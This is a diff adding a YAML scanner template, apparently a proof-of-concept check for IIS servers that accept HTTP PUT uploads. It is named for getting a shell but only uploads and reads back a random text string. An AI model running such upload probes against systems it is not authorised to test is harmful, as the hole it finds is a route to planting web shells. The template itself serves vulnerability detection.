@@ -1,0 +1,32 @@
+id: poc-yaml-iis-put-getshell
+info:
+  name: Iis Put Getshell
+  severity: medium
+  tags:
+  - 文件上传
+  finger: IIS
+  reference: []
+  description: null
+variables:
+  filename: random_str(6)
+  fileContent: random_str(6)
+transport: http
+requests:
+- method: PUT
+  path: /{{.filename}}.txt
+  headers: {}
+  data: '{{.fileContent}}'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 201
+  output: []
+- method: GET
+  path: /{{.filename}}.txt
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, fileContent)
+  output: []
